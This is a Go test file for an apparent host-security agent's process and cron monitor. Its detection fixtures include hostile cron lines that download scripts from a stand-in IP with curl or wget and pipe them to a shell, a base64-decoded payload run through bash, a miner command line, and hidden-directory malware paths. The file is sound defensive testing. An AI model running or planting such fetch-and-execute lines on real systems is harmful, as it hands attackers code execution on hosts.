package monitor

import (
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"testing"

	"github.com/xmarthost/xmartguard/agent/internal/settings"
	"github.com/xmarthost/xmartguard/agent/internal/store"
)

func TestJudge(t *testing.T) {
	cases := []struct {
		p    ProcInfo
		home string
		bad  bool
	}{
		{ProcInfo{Exe: "/usr/bin/php", Cmdline: "php /home/u/public_html/cron.php"}, "/home/u", false},
		{ProcInfo{Exe: "/home/u/public_html/wp-content/.x/kworker", Cmdline: "kworker"}, "/home/u", true},
		{ProcInfo{Exe: "/tmp/.ICE/sd", Cmdline: "sd"}, "/home/u", true},
		{ProcInfo{Exe: "/home/u/bin/app (deleted)", Cmdline: "app"}, "/home/u", true},
		{ProcInfo{Exe: "/usr/bin/python3", Cmdline: "python3 miner.py -o stratum+tcp://pool.example:3333"}, "/home/u", true},
		{ProcInfo{Exe: "/usr/bin/node", Cmdline: "node /home/u/app/server.js"}, "/home/u", false},
	}
	for _, c := range cases {
		if _, bad := Judge(c.p, c.home); bad != c.bad {
			t.Errorf("%+v: got %v", c.p, bad)
		}
	}
}

func TestJudgeCron(t *testing.T) {
	bad := []string{
		"*/5 * * * * curl -fsSL http://198.51.100.9/x.sh | sh",
		"* * * * * wget -q -O /tmp/.s http://198.51.100.9/s",
		"@reboot /dev/shm/.k/run >/dev/null 2>&1",
		"*/10 * * * * echo aGVsbG8K | base64 -d | bash",
	}
	good := []string{
		"# comment",
		"MAILTO=user@example.com",
		"*/15 * * * * /usr/local/bin/php /home/u/public_html/wp-cron.php >/dev/null 2>&1",
		"0 3 * * * /usr/bin/mysqldump db > /home/u/backup.sql",
	}
	for _, l := range bad {
		if _, b := JudgeCron(l); !b {
			t.Errorf("not flagged: %s", l)
		}
	}
	for _, l := range good {
		if r, b := JudgeCron(l); b {
			t.Errorf("flagged (%s): %s", r, l)
		}
	}
}

func TestCheckCronOnce(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("XG_STATE_DIR", filepath.Join(dir, "state"))
	t.Setenv("XG_CONFIG_DIR", filepath.Join(dir, "conf"))
	db, _ := store.Open()
	defer db.Close()
	st, _ := settings.Load()
	cron := filepath.Join(dir, "cron")
	os.MkdirAll(cron, 0o755)
	os.WriteFile(filepath.Join(cron, "bob"), []byte("*/5 * * * * curl -s http://198.51.100.9/a | bash\n"), 0o600)
	os.WriteFile(filepath.Join(cron, "trusted"), []byte("*/5 * * * * curl -s http://198.51.100.9/a | bash\n"), 0o600)
	st.Patch([]byte(`{"cron":{"whitelist_users":["trusted"]}}`))
	var got []Event
	m := &Monitor{DB: db, Settings: st, Log: slog.New(slog.NewTextHandler(io.Discard, nil)), CronDirs: []string{cron}, OnEvent: func(e Event) { got = append(got, e) }}
	m.CheckCron()
	m.CheckCron()
	if len(got) != 1 || got[0].User != "bob" {
		t.Fatalf("events: %+v", got)
	}
	evs, total, _ := m.Events("cron", 10, 0)
	if total != 1 || evs[0].Reason == "" {
		t.Fatalf("stored: %+v", evs)
	}
}
